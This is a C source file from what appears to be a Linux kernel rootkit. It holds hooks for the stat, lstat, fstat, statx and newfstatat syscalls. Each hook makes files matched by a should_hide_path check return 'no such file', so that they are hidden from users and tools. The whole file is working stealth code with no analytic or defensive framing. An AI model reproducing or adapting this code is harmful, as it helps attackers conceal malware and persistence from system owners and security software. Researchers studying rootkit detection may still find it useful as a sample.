#include "../inc/hooks.h"
#include "../inc/util.h"

#include <linux/module.h>
#include <linux/namei.h>
#include <linux/path.h>

void *_stat       = NULL;
void *_lstat      = NULL;
void *_fstat      = NULL;
void *_statx      = NULL;
void *_newfstatat = NULL;

asmlinkage int64_t h_newfstatat(const struct pt_regs *r) {
  const char __user *fn  = (void *)r->si;
  int32_t            dfd = r->di;
  struct path        fn_path;
  int64_t            ret = 0;

  hfind(_newfstatat, "__x64_sys_newfstatat");

  if (user_path_at(dfd, fn, LOOKUP_FOLLOW, &fn_path) != 0)
    goto end;

  if (should_hide_path(&fn_path))
    ret = -ENOENT;

end:
  if (ret == 0)
    hsyscall(_newfstatat);

  return ret;
}

asmlinkage int64_t h_lstat(const struct pt_regs *r) {
  const char __user *fn = (void *)r->di;
  struct path        fn_path;
  int64_t            ret = 0;

  hfind(_lstat, "__x64_sys_lstat");

  if (user_path_at(AT_FDCWD, fn, LOOKUP_FOLLOW, &fn_path) != 0) {
    debg("failed to get path struct");
    goto end;
  }

  if (should_hide_path(&fn_path))
    ret = -ENOENT;

end:
  if (ret == 0)
    hsyscall(_lstat);

  return ret;
}

asmlinkage int64_t h_fstat(const struct pt_regs *r) {
  char       *_fd_path = NULL, *fd_path = NULL;
  uint32_t    fd = r->di;
  struct path fd_path_st;
  int64_t     ret = 0;

  hfind(_fstat, "__x64_sys_fstat");

  if (NULL == (_fd_path = fd_path = kmalloc(PATH_MAX + 1, GFP_KERNEL))) {
    debg("failed to allocate memory for the fd_path");
    goto end;
  }

  if (NULL == (fd_path = path_from_fd(fd, fd_path))) {
    debg("failed to obtain path from %u", fd);
    goto end;
  }

  if (kern_path(fd_path, LOOKUP_FOLLOW, &fd_path_st) != 0) {
    debg("failed to obtain path struct from %s", fd_path);
    goto end;
  }

  if (should_hide_path(&fd_path_st))
    ret = -ENOENT;

end:
  if (ret == 0)
    hsyscall(_fstat);

  kfree(_fd_path);
  return ret;
}

asmlinkage int64_t h_statx(const struct pt_regs *r) {
  const char __user *path = (void *)r->si;
  int32_t            dfd  = r->di;
  struct path        path_st;
  int64_t            ret = 0;

  hfind(_statx, "__x64_sys_statx");

  if (user_path_at(dfd, path, LOOKUP_FOLLOW, &path_st) != 0) {
    debg("failed to get path struct");
    goto end;
  }

  if (should_hide_path(&path_st))
    ret = -ENOENT;

end:
  if (ret == 0)
    hsyscall(_statx);

  return ret;
}

asmlinkage int64_t h_stat(const struct pt_regs *r) {
  const char __user *fn = (void *)r->di;
  struct path        fn_path;
  int64_t            ret = 0;

  hfind(_stat, "__x64_sys_stat");

  if (user_path_at(AT_FDCWD, fn, LOOKUP_FOLLOW, &fn_path) != 0) {
    debg("failed to get path struct");
    goto end;
  }

  if (should_hide_path(&fn_path))
    ret = -ENOENT;

end:
  if (ret == 0)
    hsyscall(_stat);

  return ret;
}
